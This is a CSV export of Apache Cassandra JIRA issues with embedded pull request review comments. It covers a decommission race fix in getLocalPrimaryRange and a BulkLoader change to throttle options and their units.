Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 27 16:42:04 UTC 2022,,,,,,,All,,,,"0|z12x7c:",9223372036854775807,,,,adelapena,,,,Normal,,4.0-beta1,,https://github.com/apache/cassandra/commit/c3998ef6018644ff4d3aebcd0b7e3e1d566663f0,,,,,,,,,run CI,,,,,"14/Jun/22 14:26;brandon.williams;We added getLocalPrimaryRange in CASSANDRA-15637 but there's a race during decom where the endpoint can already be removed when we clone the token metadata, and tMD asserts on non-member lookups.  I added a check for the endpoint before that and return an empty collection if it doesn't exist instead.

||Branch||CI||
|[unpatched|https://github.com/driftx/cassandra/tree/CASSANDRA-17680-fail]|[100x|https://app.circleci.com/pipelines/github/driftx/cassandra/524/workflows/bef17021-85d5-45cc-80b5-45d6cc349b33/jobs/6294]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17680-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/523/workflows/d97b08f3-26d2-418c-bd7d-1d2f4a8bdbe9], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/523/workflows/41b25903-9ac0-4892-b563-7ead66746cf8], [500x|https://app.circleci.com/pipelines/github/driftx/cassandra/523/workflows/d97b08f3-26d2-418c-bd7d-1d2f4a8bdbe9/jobs/6312]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17680-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/522/workflows/424e040f-94e6-45a5-98fd-006f0ef70ba6], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/522/workflows/8e2761c4-04cf-4e02-8b5d-683dbd36c55e]|;;;","15/Jun/22 14:36;adelapena;Looks good to me. I think we would also need to apply the patch to 4.0, since that branch is also affected (reproduced [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/1703/workflows/20cd1e16-88c8-4d62-b9e2-b5b2775dd695/jobs/17793]).

;;;","15/Jun/22 14:38;adelapena;[Here|https://app.circleci.com/pipelines/github/adelapena/cassandra/1705/workflows/fbeb57a9-cefd-4397-9110-b163b5ab79b2] is a successful 500x multiplexer run for trunk.;;;","15/Jun/22 14:58;brandon.williams;bq. I think we would also need to apply the patch to 4.0

You are totally correct, I forgot that.  [Here's|https://github.com/driftx/cassandra/tree/CASSANDRA-17680-4.0] a branch, [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/527/workflows/a1498832-9c5a-4b08-85d4-6c802b674006] and [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/527/workflows/c721082e-9dec-43c2-b1e3-147d049f9598] for it.;;;","16/Jun/22 10:09;adelapena;Great, the patch for 4.0 looks good to me too, +1.

I think the tests that have failed on the last CI round for 4.0 are not new. They are {{BootstrapTest.readWriteDuringBootstrapTest}} (CASSANDRA-17139) and {{HostReplacementTest.replaceAliveHost}} (CASSANDRA-16953).

I think we are ready to commit.;;;","16/Jun/22 11:08;brandon.williams;Committed, thanks for the review.;;;","27/Jun/22 16:42;jmckenzie;[CI Results]
Branch: 4.1, build number: 70
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/70/
   JIRA: CASSANDRA-17680
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=c3998ef6018644ff4d3aebcd0b7e3e1d566663f0
   affected paths:
* src/java/org/apache/cassandra/service/StorageService.java
* CHANGES.txt

   Build Result: UNSTABLE
   Passing Tests: 47638
   Failing Tests: 10

||Test|Failures|JIRA||
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteDuringRangeMovementFollowedByConflicting|6 of 67|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.cql3.validation.operations.AggregationTest.terminated successfully|2 of 67|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.db.commitlog.BatchCommitLogTest.testOutOfOrderLogDiscardWithCompaction[2]|1 of 67|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|11 of 67|[CASSANDRA-17307?|https://issues.apache.org/jira/browse/CASSANDRA-17307]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-cdc|10 of 67|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|3 of 67|[CASSANDRA-16677?|https://issues.apache.org/jira/browse/CASSANDRA-16677]|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead|9 of 67|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.distributed.upgrade.CompactStorageHiddenColumnTest.testHiddenColumnWithCompactStorage|2 of 67|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|18 of 67|[CASSANDRA-17651?|https://issues.apache.org/jira/browse/CASSANDRA-17651]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix BulkLoader to load  entireSSTableThrottle and entireSSTableInterDcThrottle,CASSANDRA-17677,13447985,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,frankgh,e.dimitrova,e.dimitrova,01/Jun/22 17:11,30/Jan/23 10:57,13/Jul/23 08:40,19/Aug/22 21:27,4.1,4.1-alpha1,5.0,,,,Tool/bulk load,,,,0,,"{{entire_sstable_stream_throughput_outbound and entire_sstable_inter_dc_stream_throughput_outbound}} were introduced in CASSANDRA-17065.They were added to the LoaderOptions class but they are not loaded in BulkLoader as {{throttle}} and {{interDcThrottle are. }}{{As part of this ticket we need to fix the BulkLoader, also those properties should be advertised as MiB/s, not megabits/s. This was not changed in CASSANDRA-15234 for the bulk loader because those are not loaded and those variables in LoaderOptions are disconnected from the Cassandra config parameters and unused at the moment. }}
It will be good also to update the doc here - [https://cassandra.apache.org/doc/latest/cassandra/operating/bulk_loading.html,|https://cassandra.apache.org/doc/latest/cassandra/operating/bulk_loading.html]
{{and add a test that those are loaded properly when used with the BulkLoader. }}
{{CC [~frankgh] }}",,e.dimitrova,frankgh,yifanc,,,,,,,,,,,,"frankgh opened a new pull request, #1658:
URL: https://github.com/apache/cassandra/pull/1658

   `entire_sstable_stream_throughput_outbound` and `entire_sstable_inter_dc_stream_throughput_outbound` were
   introduced in CASSANDRA-17065. They were added to the LoaderOptions class but they are not being used in
   the BulkLoader class. In this commit, we make use of the entire_sstable streaming options in BulkLoader.
   In addittion, the `throttle` and `interDcThrottle` are being passed as MB/s but they should be MiB/s.
   This commit fixes the verbiage as well as setting the correct value for those properties in BulkLoader.


;01/Jun/22 22:54;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r888386976


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   Note for the second reviewer: we were discussing with Francisco that it would have been nice if we had all 4 parameters with the same unit. Probably we can add a note that those in bits are deprecated(but still keep them for compatibility) and add two more for them which can be used for the mebibytes/s. On the other hand we are already in a freeze so probably the best is to leave things as is now and add for the next release in trunk directly the opportunity to set them with units, similar to the cassandra.yaml



;02/Jun/22 20:29;githubbot;600","yifan-c commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r897330131


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");

Review Comment:
   If you are updating the default throttling, also update here. However, I'd prefer to keep it the same (unlimited), since it is an external tool. 



;14/Jun/22 21:17;githubbot;600","yifan-c commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r897331164


##########
doc/modules/cassandra/pages/operating/bulk_loading.adoc:
##########
@@ -80,13 +80,20 @@ The following options are supported, with `-d,--nodes <initial hosts>` required:
 -d,--nodes <initial hosts>                                   Required.
                                                              Try to connect to these hosts (comma separated) initially for ring information
 
+-e,--entire-sstable-throttle <throttle>                      Entire SSTable throttle
+                                                             speed in MiB/s (default 24MiB/s).

Review Comment:
   Talked offline. Although the document says 24 MiB/s, the default is actually unlimited. I feel it makes sense with unlimited for the tool



;14/Jun/22 21:18;githubbot;600","yifan-c commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r897338591


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   In this approach, would it make sense for all four options has the same unit as MEGABITS, or declare new names for the ones using MEBIBYTES? I'd prefer the later one. 
   The deprecation approach requires to declare _new_ options and mark the old ones as deprecated. Both new and old options are present. Currently, the option names are consistent with different unit. When the new option is added, there will be options names that are not consistent, but the unit is. Let's say, the new option name for throttle are `tmib` and `throttle-mib` (shorthand and full accordingly). `tmib` and `e` has inconsistent name, but they use the same unit. 



;14/Jun/22 21:29;githubbot;600","frankgh commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r899222631


##########
doc/modules/cassandra/pages/operating/bulk_loading.adoc:
##########
@@ -80,13 +80,20 @@ The following options are supported, with `-d,--nodes <initial hosts>` required:
 -d,--nodes <initial hosts>                                   Required.
                                                              Try to connect to these hosts (comma separated) initially for ring information
 
+-e,--entire-sstable-throttle <throttle>                      Entire SSTable throttle
+                                                             speed in MiB/s (default 24MiB/s).

Review Comment:
   yes, this is correct for the bulk loading. I will adjust it



;16/Jun/22 15:37;githubbot;600","frankgh commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r899235072


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");

Review Comment:
   I agree that we should keep the `unlimited` as default since it's an external tool.



;16/Jun/22 15:49;githubbot;600","frankgh commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r899301668


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   what do you think @ekaterinadimitrova2 about Yifan's proposal? my only concern with this approach is that we need to worry about the case where the user provides both parameters with different units. So we'll need to address that case



;16/Jun/22 16:42;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r901876049


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   The deprecation approach suggested by @yifan-c  makes sense to me. 
   I would expect if someone wants to use the 4 of them to use the new ones mebibytes/s for all of them.
   The old two properties with megabits/s are for compatibility with scripts. If someone wants to add also the other 2 they will decide whether they want to migrate the old ones to the new units or just add the two new properties with different units and be inconsistent.
   



;20/Jun/22 17:17;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r901881363


##########
doc/modules/cassandra/pages/operating/bulk_loading.adoc:
##########
@@ -80,13 +80,20 @@ The following options are supported, with `-d,--nodes <initial hosts>` required:
 -d,--nodes <initial hosts>                                   Required.
                                                              Try to connect to these hosts (comma separated) initially for ring information
 
+-e,--entire-sstable-throttle <throttle>                      Entire SSTable throttle
+                                                             speed in MiB/s (default 24MiB/s).

Review Comment:
   Agreed, the change was triggered by the new doc and not the opposite - those were unlimited in the code for the tool for the 4 options



;20/Jun/22 17:27;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r901892637


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");

Review Comment:
   By the way I noticed we mention unlimited but it is not explicitly said that to make it unlimited you need to set it to 0. I checked also in cassandra.yaml and I didn't find that. Maybe we should document it? 



;20/Jun/22 17:48;githubbot;600","frankgh commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r902605390


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");

Review Comment:
   maybe the text should read `(default 0 for unlimited)`



;21/Jun/22 13:15;githubbot;600","frankgh commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r902713423


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   So with Yifan's suggestion we'll have the following:
   `t`, `throttle` -> megabits (deprecated)
   `tmib`, `throttle-mib` -> mebibytes (new)
   `emib`, `entire-sstable-throttle-mib` -> mebibytes (new)
   `idct`, `inter-dc-throttle` -> megabits (deprecated)
   `idctmib`, `inter-dc-throttle-mib` -> mebibytes (new)
   `eidctmib`, `entire-sstable-inter-dc-throttle-mib` -> mebibytes (new)
   
   What do you think @yifan-c, @ekaterinadimitrova2 ?



;21/Jun/22 14:43;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r902723155


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");

Review Comment:
   SGTM



;21/Jun/22 14:51;githubbot;600","yifan-c commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r903294436


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   Looks good to me.



;22/Jun/22 05:26;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r904103152


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
